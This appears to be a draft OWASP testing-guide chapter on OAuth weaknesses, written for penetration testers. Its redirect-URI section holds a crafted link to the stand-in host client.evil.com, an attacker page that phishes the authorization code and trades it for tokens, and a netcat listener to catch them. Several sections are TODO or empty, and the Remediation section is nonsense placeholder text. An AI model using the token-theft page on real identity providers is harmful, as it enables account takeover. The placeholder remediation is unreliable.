# Testing OAuth Weaknesses

|ID          |
|------------|
|WSTG-ATHZ-05|

## Summary

[OAuth2.0](https://oauth.net/2/) is an authorization framework used in web-enabled applications and APIs it will be referred to as just OAuth.
It enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction
between the resource owner and the HTTP service, or by allowing the third-party application to obtain access on its own behalf.

Authorization information is typically being proofed using a bearer token that if presented to a service should tell the service which access rights may be assigned to the the request. Therefore the JWT checks in WSTG-SESS-10 also apply to the Testing for OAuth weaknesses chapter. The usage of Bearer Token with OAuth is described in rfc6750.

OAuth itself can be used for authentication but it is generally not recommended to implement your own way of doing so. Instead authentication should be implemented with the OpenID Connect standard.

Since OAuth's responsebillity is it to delegate access rights across several services, successfull atacks may lead to account takeover, unauthorized ressource access and the elevation of privileges.

## Test Objectives

- Are the clients Confidential or Public
- Determine which OAuth Flow is used
- Retrieve Credentials used for Authorization
- Grant yourself access to arbitrary ressources trough forcefull browsing
- Bypass the authorization

## How to Test

### Overview

OAuth has five different entities that are part of an OAuth exchange.

- Ressource Owner (user)
- User Agent (browser, native app)
- Client (the application which requests access to a Ressource on behalf of the Ressource Owner)
- Authorization Server (a server which holds authorization information and grants the access)
- Ressource Server (an application that serves content accessed by the client)

Based on the applications abillity to keep a secret in secret it seperates clients into two distinct types:

- Confidential
- Public

Confidential Clients are typically applications with server side code that are able to prevent anyone from acessing the secret.
Public Clients in contrast are unable to keep the secret secret, an example for a Public Client would be a SPA which has all the code present on the User Agent

In order to understand the attack surface it is crucial to determine which OAuth Grant Type is used for the application you are testing against.

These are the most common OAuth Grant Types:

- Authorization Code
- Consent
- Proof Key for Code Exchange (PKCE)
- Client Credentials
- Device Code
- Refresh Token

Authorization Code Grant is commonly used in conjuction with the PKCE Grant. It is also the recommended Grant Type for Public Clients.

#### Testing for exposed Client Secret

The client secret is used to authenticate the Client against the Authorization Server in order to proof that the Client is a trusted Origin.
Having a hold of the client secret in itself is not overly helpfull but can be crucial in other attacks described later.

Public clients are not able to store the client secret in a secure fashion. Some applications can still store it and rely on it, which can lead to assumptions that the client is strongly authenticated which is not the case. 

To identify the client secret in client side code one may conduct reconnaisance on the client side code.

1. Browse to the application
2. Open the Developers Toolbar (F12 in Firefox)
3. Navigate to the Debugger Tab
4. Press Ctrl+Shift+F to open the search
5. Type the search term `client-secret` for example

If this is not successfull one can also step through the authorization process, gather the client secret from the URI in the parameter `client-secret` and replace the search term of the above search with the value of the client secret to reveal the place where it is stored.

### Testing for improper Grant Type

Depending on the architecture of the web app that is tested, different grant types should be used.

#### How to test

The grant type is part of the authorization request URL. It is present in the `response_type` query parameter

```http
GET /auth/realms/example/protocol/openid-connect/auth?client_id=app-angular2&redirect_uri=http%3A%2F%client.example.com%2Fapp-angular2%2F&state=19abbae7-79cb-4e82-8ea1-897d98251f4e&response_mode=fragment&response_type=code&scope=openid&nonce=636db683-18ba-4c92-a56f-a7f7ccd772ce HTTP/1.1
Host: idp.exemple.com
[...]
```

#### Public Clients

The proper grant for public clients is the code-grant with the PKCE extension.
The authorization request for Code Flow + PKCE should contain `response_type=code` and `code_challenge=sha256(xyz)`.

#### Confidential Clients

Most of the time the code-grant with the PKCE extension can also be used for confidential clients.

### PKCE Downgrade Attack

Under certain circumstances the PKCE extension can be reomved from the authorization code flow. This has the potential to leave public clients vulnerable to attacks mitigated by the PKCE extension. 

- The authorization server does not support PKCE
- The authorization server does not properly validate PKCE

Both can be tested with a proxie tool like OWASP ZAP. An attacker may start the OAuth flow and remove  the `code_challenge=sha256(xyz)` parameter from the request.

Original Request:

```http
TODO
```

Modified Request:

```http
TODO
```

### Testing for insufficient Redirect URI Validation

The OAuth flow makes use of a `redirect_uri` in the authoritation request. If this uri is not properly validated a link can be crafted that contains a attacker controlled URL, `client.evil.com` in this example.

* `
https://idp.example.com/auth/realms/example/protocol/openid-connect/auth?client_id=app-angular2&redirect_uri=http%3A%2F%client.evil.com%2Fapp-angular2%2F&state=19abbae7-79cb-4e82-8ea1-897d98251f4e&response_mode=fragment&response_type=code&scope=openid&nonce=636db683-18ba-4c92-a56f-a7f7ccd772ce HTTP/1.1
`

If a user opens the link in the user-agent, the IdP will redirect the user agent to the spoofed URL.
The attacker can host a script on the spoofed URL that captures the `code` value and submits it back to the IdP's token endpoint.  

This can be archived with the following sample code hosted at the attacker controlles server.
Note: This JavaScript is compatible with Keycloak IdPs, other IdPs may need tweaking of the requests.
Furthermore the attack will fail when the IdP has CORS configured and blocks cross-origin requests.

If CORS is configured a setup involving server side technologies such as a python app, that allow the spoofing of the origin header, are required.

```JavaScript
<html>
    <body>
    <head>
        <title>OAuth open redirects</title>
    </head>
<h3>OAuth code: </h3>

<p id="code"></p>

<script>

    var hash = location.hash.substring(1);

    var result = hash.split('&').reduce(function (res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
    }, {});

    var code = result.code
    document.getElementById("code").innerHTML = "The code got phished: " + code;

    function submitStep1()
       {
        var step1 = new XMLHttpRequest();
        step1.open("GET", "http:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step1.html", true);
        step1.setRequestHeader("Accept", "*\/*");
        step1.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step1.send(new Blob([aBody]));
       }


    function submitStep2()
       {
        var step2 = new XMLHttpRequest();
        step2.open("GET", "http:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step2.html", true);
        step2.setRequestHeader("Accept", "*\/*");
        step2.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step2.send(new Blob([aBody]));
       }
    submitStep1();
    submitStep2();


    function submitRequest()
       {
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/token", true);
         xhr.setRequestHeader("Content-type", "application\/x-www-form-urlencoded");
         xhr.setRequestHeader("Accept", "*\/*");
         xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
         xhr.withCredentials = true;
         var body = "code=" + code + "&grant_type=authorization_code&client_id=app-angular2&redirect_uri=http%3A%2F%2Fclient.evil.com%2Fapp-angular2%2F";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i);
         xhr.send(new Blob([aBody]));
       }
    </script>

    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
    </body>
</html>
```

On the attacker server open a netcat listener to capture the response with the access token

```bash
nc -l -p 443
```

When the IdP validates the `code` the attacker can capture the `access_token` and `refresh_token` and therefore retrieves all rights that are assigned to the `access_token`.

### Cross Site Request Forgery

CSRF attacks are described in [CSRF](xxx.md) there are few targets in OAuth that can be attacked with CSRF. 

Targets:

- Consent Page
- Code Flow

#### Consent Page

The consent page is displayed to a user to verify that this user consensts in the client accessing the ressource on the users behalf. Attacking the consent page with a CSRF migth grant an aritrary client access to a ressource on behalf of the user.



### Clickjacking

When the consent page is prone to clickjacking and the attacker is in posession of the clientId (for public clients) and additionally the client secret for confidential client, the attacker can forge the users consent and gain access to the users account information throug a rogue client.

### Mix-Up Attacks

### Authorization Code Injection

During the Authorization Code flow's code exchange a code is issued by the authorization server to the client
and later exchanged against the token endpoint to retrieve authorization and refresh token.

Conduct the following tests against the authorization server:

- send a valid code for another client_id
- send a valid code for another redirect_uri
- resend the code (code replay)

The request which is send towards the token endpoint contains the code as it is exchanged against the token.
Capture this request with a proxie tool like OWASP ZAP and resend the request with the tampered values.

```http
POST /auth/realms/example/protocol/openid-connect/token HTTP/1.1
Host: idp.example.com
[...]
code=26a07de1-3a69-4f8d-b131-5e3b57538ad0.15133397-373d-4526-8230-c29db9291cfb.622460b9-0522-4251-b300-1d2e71c89e41&grant_type=authorization_code&client_id=app-angular2&redirect_uri=http%3A%2F%client.example.com%2Fapp-angular2%2F
```



### Access Token Injection

### Refresh Token Protection

- Use only once

### Client Impersonating Resource Owner

- public clients (csrf)

### Credential Leakage via Referer Header

### Credential Leakage via Browser History

## Related Test Cases

- [CORS](xxx.md)
- [CSRF](xxx.md)
- [Open Redirect](xxx.md)
- [JWT](xxx.md)
- [Clickjacking](xxx.md)

## Remediation

Do not make a habit of putting cats in boxes. Keep boxes away from cats as much as possible.

## Tools

- BurpSuite
- OWASP ZAP

## References

- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)
- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)
- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)
- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)
